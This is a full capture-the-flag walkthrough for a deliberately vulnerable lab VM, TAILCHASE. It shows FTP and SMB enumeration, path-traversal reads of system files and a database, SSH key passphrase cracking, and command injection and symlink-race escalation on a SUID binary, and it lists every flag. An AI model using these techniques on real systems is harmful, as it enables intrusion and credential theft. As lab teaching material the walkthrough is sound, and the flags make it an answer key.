# 🐱 TAILCHASE v1.0: Official Walkthrough
**Author:** Ankit Patidar  
**Difficulty:** OSCP-Level Medium

> ⚠️ **SPOILER ALERT**: Contains complete solution!

---

## Step 1: Network Reconnaissance

```bash
# Find the VM IP
netdiscover -r 192.168.56.0/24

# Full port scan
nmap -sC -sV -p- 192.168.56.X
```

**Expected Results:**
```
PORT    STATE  SERVICE     VERSION
21/tcp  open   ftp         vsftpd
22/tcp  open   ssh         OpenSSH
25/tcp  open   smtp        Postfix
80/tcp  open   http        nginx
139/tcp open   netbios-ssn Samba smbd
445/tcp open   netbios-ssn Samba smbd
8080/tcp open  http        Python http server
```

---

## Step 2: FTP Anonymous Access

```bash
ftp 192.168.56.X
# Name: anonymous
# Password: (any)
```

**Key Files Found:**
- `readme.txt`: Company memo about terminated employee
- `.devops_note.txt`: Hidden note from DevOps (misdirection!)
- `backups/.config.b64`: Base64 encoded "password"

```bash
cat .devops_note.txt
# Misdirection: "passwords hidden in plain sight"

cat backups/.config.b64 | base64 -d
# "devops:ilovecats!!!!" - FAKE CREDENTIALS (misdirection)
```

---

## Step 3: SMB Share Enumeration

```bash
# List shares (guest access)
smbclient -L //192.168.56.X -N

# Connect to readable shares
smbclient //192.168.56.X/SharedDocs -N
smbclient //192.168.56.X/IT_Stuff -N
```

**IT_Stuff** contains `audit_report.txt` with critical hint:
> "DevOps's SSH key was found to be encrypted with a weak passphrase"

---

## Step 4: Web Enumeration: Company Website

Browse to `http://192.168.56.X`: Full corporate website!

**Source Code Hints:**
- `<!-- TODO: Remove debug endpoints before production deploy -->`
- `<!-- Dev note: /portal/ still using default credentials? -->`
- Blog post about Mousetrap 2.1: `<!-- API Key: sk_test_... -->`

---

## Step 5: Portal Exploitation

Browse to `http://192.168.56.X/portal/`

### Timing Side-Channel Attack

Login timing reveals valid usernames:
```bash
# Try usernames, measure response time
# Valid users: devops, secops, sarah: 200ms delay
# Invalid users: immediate response
```

### API Recon

```bash
# Debug info leak
curl http://192.168.56.X/portal/api/status?debug=1

# Config extraction
curl http://192.168.56.X/portal/api/config?key=devops_ssh_key_location
# Returns: /home/devops/.ssh/id_rsa
```

### Path Traversal (LFI)

```bash
# Read machine-id for Werkzeug PIN
curl "http://192.168.56.X/portal/api/file?path=../../../etc/machine-id"

# Read boot_id
curl "http://192.168.56.X/portal/api/file?path=../../../proc/sys/kernel/random/boot_id"

# Read MAC address
curl "http://192.168.56.X/portal/api/file?path=../../../sys/class/net/eth0/address"
```

### DevOps Auto-Login (Debug Mode)

Login with username `devops` and ANY password: debug mode allows auto-access!
→ Dashboard shows admin role

---

## Step 6: Database Extraction → SSH Key

```bash
# The portal.db contains DevOps's SSH key
curl "http://192.168.56.X/portal/api/file?path=../../../opt/portal_api/portal.db" -o portal.db

# Extract SSH key
sqlite3 portal.db "SELECT content FROM notes WHERE id=10;" | base64 -d > devops_key
chmod 600 devops_key
```

### Crack the SSH Passphrase

```bash
ssh2john devops_key > key_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt key_hash.txt
# Passphrase: cat123
```

**Hint found:** `/home/devops/.passphrase_hint.txt` contains "cat123"

### SSH Access

```bash
ssh -i devops_key devops@192.168.56.X
# Passphrase: cat123
```

---

## Step 7: User Flag

```bash
cat /home/devops/user.txt
```

```
Flag: TAILCHASE{wh0_1s_th3_c4t_wh0_1s_th3_m0us3}
```

---

## Step 8: Privilege Escalation: SUID Binary

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# /usr/local/bin/.devops_agent (hidden file!)
```

### Method A: Command Injection
```bash
/usr/local/bin/.devops_agent
# > ping 127.0.0.1; /bin/bash
# Root shell!
```

### Method B: Race Condition (TOCTOU)
```bash
# The "read" command has a race window
# Terminal 1:
cd /tmp
ln -sf /root/root.txt
while true; do rm -f /tmp/target; ln -sf /root/root.txt /tmp/target; done

# Terminal 2:
/usr/local/bin/.devops_agent
# > read /tmp/target
# During the 2-second sleep, Terminal 1 races to create symlink
```

### Method C: Hardcoded Backdoor
```bash
strings /usr/local/bin/.devops_agent | grep -i pass
# Password: DevOpsRocks!

/usr/local/bin/.devops_agent --override DevOpsRocks!
# Root shell!
```

---

## Step 9: Root Flag

```bash
cat /root/root.txt
```

```
Flag: TAILCHASE{t@1lch4s3_m4st3r_0f_d1sgu1s3}
```

---

## Alternative Path: Port 8080 Service

```bash
nc 192.168.56.X 8080
# DevOps Backdoor Service v2.0
# Use: EXEC|<command> to execute
# EXEC|id
# EXEC|cat /home/devops/user.txt
```

---

## Bonus Flags

```bash
cat /opt/.secrets/.bonus_flag.txt
# TAILCHASE{d3v0ps_w4s_h3r3}
```

---

## 🏁 Flags Summary

| Flag | Value | Found At |
|------|-------|----------|
| Bonus | `TAILCHASE{d3v0ps_w4s_h3r3}` | `/opt/.secrets/` |
| User | `TAILCHASE{wh0_1s_th3_c4t_wh0_1s_th3_m0us3}` | `/home/devops/user.txt` |
| Root | `TAILCHASE{t@1lch4s3_m4st3r_0f_d1sgu1s3}` | `/root/root.txt` |

---

**M4d3 w1th ❤️  by Ankit Patidar**
